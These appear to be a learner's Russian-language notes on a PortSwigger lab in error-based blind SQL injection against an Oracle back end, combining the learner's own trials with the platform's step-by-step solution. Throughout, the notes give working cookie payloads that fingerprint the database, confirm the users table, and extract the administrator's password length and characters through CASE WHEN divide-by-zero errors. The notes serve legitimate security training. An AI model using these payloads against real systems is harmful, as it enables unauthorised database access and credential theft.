# Blind SQL injection vulnerabilities
# *СЛЕПЫЕ SQLi  (2/7 лаба в этой теме)

# Blind SQL injection with conditional responses
# С УСЛОВНЫМИ ОТВЕТАМИ ИЛИ BOOL 

##   2/7 SQL-инъекция на основе ошибок
цель - побудить сервер/приложение вернуть текст ошибку
управляя запросом можно через нее также вытаскивать данные

==КРАТКО СМЫСЛ:==
# CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

//если  (1=1) будет TRUE тогда выполнится THEN 1/0 который вызов ERROR
```
как это работает:
-- Логика:
-- 1. Проверяем (1=2) → это FALSE
-- 2. Раз FALSE → выполняем ELSE 'a'
-- 3. Возвращаем 'a' и сравниваем с ='a и ошибки нет!

 -4 если же   Проверяем (1=1) → это TRUE
    тогда придется выполнить блок с делением 1 на 0 который даст ошибку!
    и по налицию ошибки я пойму что мое условие выполнилось!


----------------
==пример==
CASE WHEN (УСЛОВИЕ) THEN 1/0 ELSE 'a' END

**ЕСЛИ УСЛОВИЕ = TRUE** → выполнится `THEN 1/0` → **ОШИБКА**  
**ЕСЛИ УСЛОВИЕ = FALSE** → выполнится `ELSE 'a'` → **НЕТ ОШИБКИ**

---------





вот как можно использовать:
```sql
' AND (SELECT CASE 
           WHEN SUBSTRING(password,1,1)='a'  -- ЕДИНСТВЕННОЕ условие
           THEN 1/0        -- Если TRUE → деление на 0 → ОШИБКА
           ELSE 'a'        -- Если FALSE → возвращаем 'a'
         END FROM users WHERE username='admin')='a
         
         // если SUBSTRING(password,1,1)='a' будет TRUE 
         // тогда выполнится THEN 1/0 который вызовет ошибку
```

Вот вариант который предлагает для решения платформа:
```sql
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```


исходные данные для выполнения лабы
`users`, with columns called `username` and `password`. 
find out the password of the `administrator`

начал лабу:

1) перехват обновления страницы лич каб
2) нашел парметр в куки который  с кавычкой вызвает краш
3) но если '--  или  ''  то краша нет  
4) то есть если вызывать ошибки в бд - получаем краш!
5) ошибок нет - нет краша!

6)  пытался долго применить запросы как выше
7) и только потом провел разведку бд
8) ' AND (SELECT 'a' FROM dual)='a'--    // оказалось - это oracle
9)  ' AND (SELECT 'a')='a'--                         // а это проверка на PostegerS
10)  в справочнике нашел что для оракл вот так выглядит запрос на условия 
		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual


```sql
	//oracle
	' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
	
	'//это для ORACLE условный запрос который не вызывает ошибки
	// теперь можно внутрь помещать вопросы 
	
	// этот запрос в oracle проверка наличия table_name='USERS' в бд 
	' AND (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>1-- //'
	```

не смог решить эту лабу так как тут был сраный ORACLE у которого синтаксис сильно отличается и не работал с ним - пришлось подсмотреть подскзку и по подсказке решил,
#### Решение

1. Посетите первую страницу магазина и используйте Burp Suite для перехвата и изменения запроса, содержащего файл cookie `TrackingId`. Для простоты, предполопустим, что исходное значение файла cookie isTrackingId`TrackingId=xyz`.
2. Измените файл cookie `TrackingId`, прилов к нему одну кавычку:
    
    `TrackingId=xyz'`
    
    Убедитесь, что получено сообщение об ошибке.
    
3. Теперь измените его на две кавычки:`TrackingId=xyz''`Убедитесь, что ошибка исчезла. Это говорит о том, что синтаксическая ошибка (в данном случае незакрытая кавычка) оказывает обнаруживаемое влияние на ответ.
4. Теперь вам нужно подтвердить, что сервер интерпретирует инъекцию как SQL-запрос, т.е. что ошибка является синтаксисной ошибкой SQL, в отличие от любого другого вида ошибки. Для этого вам сначала нужно построить подзапрос, используя действительный синтаксис SQL. Попробуйте отправить:
    
    ```sq
    `TrackingId=xyz'||(SELECT '')||'`
    ``` // не работает так как бд оракл
    
    В этом случае обратите внимание, что запрос все еще кажется недействительным. Это может быть связано с типом базы данных - попробуйте указать предсказуемое имя таблицы в запросе:
    
    `TrackingId=xyz'||(SELECT '' FROM dual)||'` // фром дуал - это сработало - значит оракл бд ==|| две полоски испольуются вместо AND == 
    == ==а вот слово dual = это в оракл есть к каждой бд оракл такая таблица dual==
    *поэтому если сработало с dual значит это бд oracle*
    
    As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.
    
5. Теперь, когда вы создали то, что кажется действительным запросом, попробуйте отправить недействительный запрос, сохраняя при этом допустимый синтаксис SQL. Например, попробуйте запросить несуществующее имя таблицы:
    
    `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'` 
    *проверил на несузествующей таблице  = ответ ошибка!*
    
    На этот раз возвращается ошибка. Такое поведение убедительно предполагает, что ваша инъекция обрабатывается как SQL-запрос бэк-эндом.
    
6. До тех пор, пока вы всегда вводите синтаксически действительные SQL-запросы, вы можете использовать этот ответ на ошибку для вывода ключевой информации о базе данных. Например, чтобы убедиться в существовании таблицы `users`, отправьте следующий запрос:
    
    `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
    *ошибки нет - значит запрос рабочий*
    *я вывел запрос ' ' из таблицыю юзер из колонны 1*
    
    As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.
    
7. Вы также можете использовать это поведение для тестирования условий. Сначала отправьте следующий запрос:
    
    `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    *если условия  WHEN (1=1) = true - тогда выполнил THEN TO_CHAR(1/0) которое делит 1 на 0 = ошибка!*
    *получил смс об ошибке*
    Убедитесь, что получено сообщение об ошибке.
    
8. Теперь измените его на:
    
    `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    // *не падает бд так*
    *WHEN (1=2) = false^ поэтому условие then не выполняется и выполняется ELSE который ищет  ' ' в табилице dual  и ошибки нет*
    
    Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.
    
9. Вы можете использовать это поведение, чтобы проверить, существуют ли определенные записи в таблице. Например, используйте следующий запрос, чтобы проверить, существует ли имя пользователя `administrator`:
    
    `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    *проверил ессть ли administrator в табилце users в колонке username так как 1=1 истина - то выполнился блок с then который делит на 0 и вызывает ошибку и по наличию ошибки я понимаю что  такой пользователь есть*
    
    Убедитесь, что условие истинно (получена ошибка), подтвердив, что есть пользователь с пользователем `administrator`.
    
10. Следующим шагом является определение количества символов в пароле пользователя-администратора. Для этого измените значение на:
    
    `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

    *фугкция LENGTH()  возвращает число символов + условие >1 , если оно тру тогда блок then выдаст ошибку - далее перебираю число сиволов в пароле*
    
    Это условие должно быть верным, подтверждая, что длина пароля превышает 1 символ.
    
12. Отправьте серию последующих значений, чтобы проверить разную длину паролей. Отправить:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    Затем отправьте:
    
    `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    
    И так далее. Вы можете сделать это вручную с помощью [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), так как длина, скорее всего, будет короткой. Когда условие перестает быть истинным (т.е. когда ошибка исчезает), вы определили длину пароля, который на самом деле составляет 20 символов.
	     *определил что символов в пароле 20*
    
14. После определения длины пароля следующим шагом является проверка символа в каждой позиции, чтобы определить его значение. Это включает в себя гораздо большее количество запросов, поэтому вам нужно использовать [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Отправьте запрос, над которым вы работаете, в Burp Intruder, используя контекстное меню.
15. Перейдите в Burp Intruder и измените значение файла cookie на:
    
    `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
				*функция SUBSTR(текс,1,1) позволяет выбирать нужную букву из текста и мы сравниваем ее с той что в конце условия= если угадал - то выдвется ошибка! значит это та самая буква  - к примеру такойсвызов функции SUBSTR(женя,3,1) вернет третью букву Н*
    
  *ну и в интрудере я подставил значения и вставлял автоматически туда пейлоад букв и цифр и вывел весь пароль, *